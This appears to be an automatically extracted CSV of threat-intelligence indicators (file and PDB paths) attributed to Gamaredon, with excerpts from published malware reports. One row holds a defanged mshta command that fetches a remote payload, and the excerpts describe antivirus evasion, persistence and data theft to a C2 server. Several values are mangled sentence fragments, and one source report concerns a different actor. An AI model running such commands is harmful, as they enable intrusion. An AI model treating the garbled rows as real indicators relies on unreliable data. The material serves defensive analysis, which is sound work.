schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--gamaredon,artifact--sha256:a5287287002db5bbab7aee529389a10919448b3eae2db0c31ade94275d4163f4,observation--sha256:e0a39c53673d2eeb9bf5af71428b993d68230a31df15172ab279c29e43d248ed,file-path,%userprofile%\AppData\Local\Support,%userprofile%\AppData\Local\Support,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"• Communicate via FTP. • Send email via SMTP. • Change permissions on files using the cacls.exe command-line utility. JPIN can also target mobile suite applications and extract data from them. The backdoor contains code that looks for installed instances of Symbian, Blackberry, and Windows Phone management applications. If any are found, the backdoor logs sync dates, IMEI data, phone manufacturer and model information, software version date, memory, location, and capacity, among other things. Th",
1.0.0,actor--gamaredon,artifact--sha256:e7d8a0ac3ff478056eee9a8410a46c3de9d6069f89c26217c5fb36905ef81580,observation--sha256:9a253b092a37763bbf8b2a086017433c39be974c7997b921d550aac157aca30e,file-path,"%userprofile%\AppData\Resource\Jpin. After it is installed and started, the JPIN service can perform","%userprofile%\AppData\Resource\Jpin. After it is installed and started, the JPIN service can perform",candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 15. Security-related processes avoided by the JPIN installer Process Security product 360tray.exe 360 Safeguard bdagent.exe BitDefender proguard.exe Process Guard blackd.exe BlackICE blackice.exe BlackICE savservice.exe Sophos Anti-Virus avp.exe Kaspersky Anti-Virus rstray.exe Rising Anti-virus cmccore.exe CMC Antivirus cmctrayicon.exe CMC Antivirus zhudongfangyu.exe 360 Safeguard After installing the backdoor, the installer deletes itself from the compromised computer. PLATINUM uses at l",
1.0.0,actor--gamaredon,artifact--sha256:fa743c7e194649ffc81227e1671a6500587570dcfe97ecac86cd8a27a6ae5760,observation--sha256:150b917f5a2a0de229dcb881785e968df8e946bfedcb6b0f38f321b6ac27c111,file-path,%windir%\system32\mshta.exe http://194.180.174[.]203/23.01/mo/baseball[.]DjVu,%windir%\system32\mshta.exe http://194.180.174.203/23.01/mo/baseball.DjVu,candidate,,unknown,unknown,not-stated,,source--gamaredon--a0d52e16421d8b11,Gamaredon/Beyond_Bullets_and_Bombs_An_Examination_of_Armageddon_Groups_Cyber.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Beyond Bullets and Bombs: An Examination of Armageddon Group's Cyber Warfare Against Ukraine 9 %windir%\system32\mshta.exe http://194.180.174[.]203/23.01/mo/baseball[.]DjVu MITRE ATT&CK TECHNIQUE NAME TECHNIQUE ID Spearphishing Attachment T1566.001 User Execution T1204.002 System Binary Proxy Execution: Mshta T1218.005 Defense Evasion Abusing Telegram to Bypass DNS Generally in the second stage, a malicious VBScript is used then they abuse Telegram to get the real C2 IP address. For example http",
1.0.0,actor--gamaredon,artifact--sha256:10ecd0af6ca849dc3169d07610918df94cd9db8273bfe53de3e323b9e13dd5f2,observation--sha256:aeb5633f1a47b9dcf34f2b46ad25f105d0534f76bc9e668bad9c14a541c4c881,file-path,"C:\Program Files\Windows Journal\Templates\Cpl\jnwmon.exe –ua), which may be","C:\Program Files\Windows Journal\Templates\Cpl\jnwmon.exe –ua), which may be",candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"2. The backdoor is injected into svchost using the hot patch API. Patching the loader is done by creating a section named \knowndlls\mstbl.dll. This DLL does not reside on disk, but is rather treated as a cached DLL by the session manager. It then proceeds to write a PE file within that section. 3. The PE file will have one section (.hotp1) with the hot patch header structure. This structure contains all the information necessary to perform the patching of function ntdll!LdrpMapViewOfSection, wh",
1.0.0,actor--gamaredon,artifact--sha256:d661f3e5082fc1a442c343c2594cc0986136926f011e2b2973aaa4ecd81c6f4e,observation--sha256:fc9278f54dbdf3833f20ba06e65c021b0486411a502d6fd790ee812bc3f5a9f4,file-path,C:\Users\...\AppData\Roaming\Microsoft\Шаблоны\Normal.dotm,C:\Users\...\AppData\Roaming\Microsoft\Шаблоны\Normal.dotm,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"41 keys with data parts are created in the registry branch HKEY_USERS\""USER""\Enviroment\userData1…userData41. During the operation of the malware, this data is concatenated and a malicious process is started on the compromised system. The malicious code is used to collect i nformation about the victim's system (computer name and serial numbers of hard drives), which is sent to the attacker's command & control server. If the connection is successful, the response will result in another malicious ",
1.0.0,actor--gamaredon,artifact--sha256:5ebc026c867b8d6fe30642d68da4aff8a68e4211b1b66d79dde0e32bc57df657,observation--sha256:07c5a488badb14597279023b522193a61dd56d3d99ac52400db771e3c576f88b,file-path,C:\Users\{username}\AppData\Local\IconsCache.db”,C:\Users\{username}\AppData\Local\IconsCache.db”,candidate,,unknown,unknown,not-stated,,source--gamaredon--43ece8b760fd4f72,Gamaredon/Cybergun_Technical_Analysis_of_the_Armageddons_Infostealer.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Cybergun: Technical Analysis of the Armageddon's Infostealer 11 Then it stores the filenames under “C:\Users\{username}\AppData\Local\IconsCache.db” Using this technique to understand whether it is a unique file or not. If the file is a unique file it sends all the contents of the file to the C2 server using HTTPS.,
1.0.0,actor--gamaredon,artifact--sha256:703ff9884e7470105d19161fab0c04091301f32e7657d5fb4a4f3f505a67c455,observation--sha256:4b658bbf4832d93a67ef03f2346ea4ad24e02dcc809c9b824c7567a1a09a255c,file-path,C:\WINDOWS\system32\WindowsPowerShell \v1.0\powershell.exe  as their target and a newly added,C:\WINDOWS\system32\WindowsPowerShell \v1.0\powershell.exe as their target and a newly added,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"25 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 For both vari ants, we have only seen PteroDash being used as a downloader component of PteroTemplate. PteroDig PteroDig (SHA -1: 1AEAE7A567C71200BA804801C4CEC227D2B64414 ), which we discovered in November 2022, is a PowerShell tool that weaponizes selected Desktop LNK files. It drops a basic skeleton of a downloader to %USERPROFILE% and stores relevant parts of the downloader script in the registry ",
1.0.0,actor--gamaredon,artifact--sha256:e277020d7080c38e7a99cd013d9781cc4e1c486013af134595ea21dd86243261,observation--sha256:2a3e1d9f02199018ee2b32bed8091b04e9ce90ff14221295f2425851fb6a7211,file-path,C:\\Users\\{username}\\AppData\\Local\\TEMP\\XXXXXXXXXX”,C:\\Users\\{username}\\AppData\\Local\\TEMP\\XXXXXXXXXX”,candidate,,unknown,unknown,not-stated,,source--gamaredon--43ece8b760fd4f72,Gamaredon/Cybergun_Technical_Analysis_of_the_Armageddons_Infostealer.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Cybergun: Technical Analysis of the Armageddon's Infostealer 7 L”C:\\Users\\{username}\\AppData\\Local\\TEMP\\XXXXXXXXXX” Then it reads main volume’s (“C:\\”) serial number and return as a string, then it will concat the other information that taken from the PC like “ComputerName||UserName||Random12CharString||VolumeSerialNumber” Before connecting the C2 Server it first prepares the hardcoded domain name with random string subdomain.",
1.0.0,actor--gamaredon,artifact--sha256:ad64550346bd9c85e54880dded13f6d378482dbb86bc058baa06a5052d3a8164,observation--sha256:7df90c05311fe7e99cd07115b18a2be395ceb536a3349815dfffb4eb32b54936,file-path,C:\\Users\\{username}\\AppData\\Local\\profiles_c.ini” .,C:\\Users\\{username}\\AppData\\Local\\profiles_c.ini”,candidate,,unknown,unknown,not-stated,,source--gamaredon--43ece8b760fd4f72,Gamaredon/Cybergun_Technical_Analysis_of_the_Armageddons_Infostealer.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Cybergun: Technical Analysis of the Armageddon's Infostealer 6 To gain persistence, it creates a registry entry “Windows Task” under the RUN key. Then it prepares the string for L”C:\\Users\\{username}\\AppData\\Local\\profiles_c.ini” . After it creates a 12 characters random “x” string it creates a directory under the %TEMP% with the name of “x” string.",
1.0.0,actor--gamaredon,artifact--sha256:f35203bbec0a16e147c54ac67f2933aa6ebd174a9391ad393417e0d44487247d,observation--sha256:ec5251c6923cfe26a76402a396480b5cdd06dc40646303bba84c7320eac36509,file-path,"C:\\”) serial number and return as a string, then it will concat","C:\\”) serial number and return as a string, then it will concat",candidate,,unknown,unknown,not-stated,,source--gamaredon--43ece8b760fd4f72,Gamaredon/Cybergun_Technical_Analysis_of_the_Armageddons_Infostealer.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Cybergun: Technical Analysis of the Armageddon's Infostealer 7 L”C:\\Users\\{username}\\AppData\\Local\\TEMP\\XXXXXXXXXX” Then it reads main volume’s (“C:\\”) serial number and return as a string, then it will concat the other information that taken from the PC like “ComputerName||UserName||Random12CharString||VolumeSerialNumber” Before connecting the C2 Server it first prepares the hardcoded domain name with random string subdomain.",
1.0.0,actor--gamaredon,artifact--sha256:8a7325e74c9fd5635902d005acd0d5a76c58be03bce2cee67be934889201383a,observation--sha256:947cb8c066e90c2ca2eb1a1fc0917035194cd142c98a8e8eb8b122ac740c4a7e,file-path,E:\***.exe,E:\***.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Once persistence mechanism is implemented in the victim's system, the orchestrator cmd file checks the presence of connected removable data storage and copies PE files from the directory %APPDATA%\Microsoft\Crypto\keys\serial number of the volume \executable file every 5 minutes. During the copying process, the file name is changed, and the file hidin g attributes are set to attrib +h +s /s E:\***.exe A shortcut called New folder is created on the attached media through the marker ""3"" from the s",
1.0.0,actor--gamaredon,artifact--sha256:5d14c5fdddeba133efa80d50178bdc79f8ddebb207b2f94547effe1eab002fad,observation--sha256:13b293425a767a901a0a557dddeeef181c53ef574372cc792a2db2ebb7e19cd3,file-path,E:\Boot,E:\Boot,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Once persistence mechanism is implemented in the victim's system, the orchestrator cmd file checks the presence of connected removable data storage and copies PE files from the directory %APPDATA%\Microsoft\Crypto\keys\serial number of the volume \executable file every 5 minutes. During the copying process, the file name is changed, and the file hidin g attributes are set to attrib +h +s /s E:\***.exe A shortcut called New folder is created on the attached media through the marker ""3"" from the s",
1.0.0,actor--gamaredon,artifact--sha256:48fb2c74fcba2c4dd6fca2a02e4b062ddb31b895b0941192e56fcb98d78a8fa3,observation--sha256:7ad8125b276dcc107da1fa88cb93cfa720f31d1d5d674b41260567a2a32bdf61,file-path,E:\Boot\*.doc,E:\Boot\*.doc,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Once persistence mechanism is implemented in the victim's system, the orchestrator cmd file checks the presence of connected removable data storage and copies PE files from the directory %APPDATA%\Microsoft\Crypto\keys\serial number of the volume \executable file every 5 minutes. During the copying process, the file name is changed, and the file hidin g attributes are set to attrib +h +s /s E:\***.exe A shortcut called New folder is created on the attached media through the marker ""3"" from the s",
1.0.0,actor--gamaredon,artifact--sha256:74ade1ec2dbe49eb04af26e01ccd3d859d60db1b0c3130de284eef1228b7fdfe,observation--sha256:33b2ed562edb026e9348c142f510a8250dfc22f61ca816201b984fb5220ecbdc,file-path,E:\Projects\RESEARCH\TOOLS\c++\Reverse\Release\Reverse.pdb,E:\Projects\RESEARCH\TOOLS\c++\Reverse\Release\Reverse.pdb,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"32 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroClone Discovered by ESET Research in July 2023, PteroClone (SHA-1: 5720FFDF9D9CD649445CBC12844E2B587622643A ) is a unique PowerShell tool that uses a legitimate command line program – rclone – for managing files on cloud storage to download the next stage . It first downloads the rclone binary and c onfiguration file to %APPDATA%\Defrag , naming them Defrag.exe and rclone.conf , respectively. It",
1.0.0,actor--gamaredon,artifact--sha256:0af56fe611fb8a25d7d5f77ab1c99ca824fa72a4ec60948bf72e78bd89341ca9,observation--sha256:48b821ec00b6c6323f7ae60d2c72fcd78e73f35ab67c6b49ad68cd911eac9f2f,file-path,E:\Projects\sfx\Extractor10\281021\Debug\090721.pdb,E:\Projects\sfx\Extractor10\281021\Debug\090721.pdb,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 22}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"21 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 payload, pauses for a few seconds, and deletes all three files: the dropper, itself, and the VBScript payload. Throughout PteroCDrop’s lifetime, Gamaredon has used various compilers to build it and in some of the samples this PDB path was left: E:\Projects\sfx\Extractor10\281021\Debug\090721.pdb Overall, the most prevalent payload delivered by PteroCDrop is a VBScript version of PteroLNK. During 2023",
1.0.0,actor--gamaredon,artifact--sha256:29b45610f9cacd6de2575df801ca4c7481b8d5e8a780b4dea97c5fbb356ce73a,observation--sha256:91ec73c8f76a8f033f5097117018dc38fa9d44994fa16c6bfe0f1b3c5c39db07,pdb-path,E:\Projects\RESEARCH\TOOLS\c++\Reverse\Release\Reverse.pdb,E:\Projects\RESEARCH\TOOLS\c++\Reverse\Release\Reverse.pdb,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"32 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroClone Discovered by ESET Research in July 2023, PteroClone (SHA-1: 5720FFDF9D9CD649445CBC12844E2B587622643A ) is a unique PowerShell tool that uses a legitimate command line program – rclone – for managing files on cloud storage to download the next stage . It first downloads the rclone binary and c onfiguration file to %APPDATA%\Defrag , naming them Defrag.exe and rclone.conf , respectively. It",
1.0.0,actor--gamaredon,artifact--sha256:3464949a2b5c7673bb0f305cbe29e4c9f895ce5d427e2abcab087784c0fee906,observation--sha256:a7d785549af61b6dd34b5b17e203232bee805003d1959009438869f13e5821af,pdb-path,E:\Projects\sfx\Extractor10\281021\Debug\090721.pdb,E:\Projects\sfx\Extractor10\281021\Debug\090721.pdb,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 22}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"21 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 payload, pauses for a few seconds, and deletes all three files: the dropper, itself, and the VBScript payload. Throughout PteroCDrop’s lifetime, Gamaredon has used various compilers to build it and in some of the samples this PDB path was left: E:\Projects\sfx\Extractor10\281021\Debug\090721.pdb Overall, the most prevalent payload delivered by PteroCDrop is a VBScript version of PteroLNK. During 2023",
